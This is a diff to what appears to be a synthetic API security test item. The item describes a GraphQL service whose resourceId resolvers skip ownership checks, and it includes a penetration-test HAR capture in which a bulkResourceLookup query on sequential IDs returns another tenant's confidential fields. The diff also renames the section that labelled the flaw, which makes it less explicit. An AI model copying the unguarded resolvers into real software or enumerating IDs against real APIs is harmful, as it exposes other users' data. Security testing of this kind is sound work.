@@ -57,12 +57,13 @@ type Mutation {
   Tracked internally as a known gap pending remediation.
 - The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without
   per-ID ownership filtering.
+- Resource IDs follow the format `R-{number}` (e.g., R-1425, R-2425, R-3425).
 
-## 5.0 Vulnerability Context
-**Pattern:** 1.8 — Predictable or sequential IDs (BOLA)
+## 5.0 Behavioral Notes
 
 The `resourceId` field is used as the object identifier across all resolvers.
-The resolver handling `resourceId` does not enforce ownership or tenancy boundaries, enabling Pattern 1.8 exploitation.
+The resolver handling `resourceId` does not enforce ownership or tenancy boundaries.
+Resource identifiers are formatted as `R-{sequential_number}`, assigned incrementally at record creation.
 
 ## 6.0 HAR Capture (Network Trace)
 The following HTTP Archive (HAR) capture was recorded during a penetration test.
@@ -90,7 +91,7 @@ The attacker's token belongs to `tenant-8369` but the requested object belongs t
           "queryString": [],
           "postData": {
             "mimeType": "application/json",
-            "text": "{\"query\": \"query VulnerableOp { bulkResourceLookup(ids: ["R-2425", "R-1425", "R-3425"]) { resourceId tenantId data { sensitiveField } } }\"}"
+            "text": "{\"query\": \"query VulnerableOp { bulkResourceLookup(ids: [\\\"R-2425\\\", \\\"R-1425\\\", \\\"R-3425\\\"]) { resourceId tenantId data { sensitiveField } } }\"}"
           },
           "bodySize": 126
         },
@@ -104,7 +105,7 @@ The attacker's token belongs to `tenant-8369` but the requested object belongs t
           "content": {
             "size": 226,
             "mimeType": "application/json",
-            "text": "{\"data\": {\"getResource\": {\"tenantId\": \"tenant-c0d0\", \"ownerId\": \"other-user-8369c0d0\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-8369c0d0\", \"internalNotes\": \"Internal data exposed\"}}}}"}"
+            "text": "{\"data\": {\"getResource\": {\"tenantId\": \"tenant-c0d0\", \"ownerId\": \"other-user-8369c0d0\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-8369c0d0\", \"internalNotes\": \"Internal data exposed\"}}}}"
           },
           "bodySize": 581,
           "redirectURL": "",
